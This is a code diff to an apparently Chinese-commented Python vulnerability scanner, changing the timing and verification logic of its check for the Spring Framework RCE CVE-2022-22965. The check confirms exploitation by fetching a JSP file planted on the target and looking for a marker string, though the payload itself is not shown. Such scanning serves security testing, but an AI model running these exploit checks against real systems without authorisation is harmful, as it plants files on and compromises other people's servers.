@@ -33,6 +33,8 @@ class Spring():
         ]
 
     def cve_2022_22965_scan(self, url):
+        ''' Spring Framework 远程代码执行漏洞(Spring core RCE)
+        '''
         vul_info = {}
         vul_info['app_name'] = self.app_name
         vul_info['vul_type'] = 'RCE'
@@ -68,6 +70,7 @@ class Spring():
                 )
                 vul_info['status_code'] = str(res.status_code)
                 logger.logging(vul_info)                        # * LOG
+                sleep(5)                                        # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
             except requests.ConnectTimeout:
                 vul_info['status_code'] = 'Timeout'
                 logger.logging(vul_info)
@@ -77,10 +80,19 @@ class Spring():
                 logger.logging(vul_info)
                 return None
 
-            for i in range(5):
-                sleep(3)                                # * 延时, 因为命令执行可能有延迟, 要等一会判断结果才准确
-                verify_url = url + 'mouse.jsp'
-                verify_res = requests.get(
+            verify_url = url + 'mouse.jsp'
+            verify_res = requests.get(
+                    verify_url, 
+                    timeout=self.timeout, 
+                    proxies=self.proxies, 
+                    verify=False,
+                    allow_redirects=False
+                )
+
+            if (verify_res.status_code == 200):
+                for i in range(5):
+                    sleep(1)                                # * 延时, 因为命令执行的回显可能有延迟, 要等一会判断结果才准确
+                    verify_res = requests.get(
                         verify_url, 
                         timeout=self.timeout, 
                         proxies=self.proxies, 
@@ -88,7 +100,7 @@ class Spring():
                         allow_redirects=False
                     )
 
-                if ((verify_res.status_code == 200) and ('22965' in verify_res.text)):
+                if ((verify_res.status_code == 200) and ('CVE/2022/22965' in verify_res.text)):
                     results = {
                         'Target': target,
                         'Verify': verify_url,
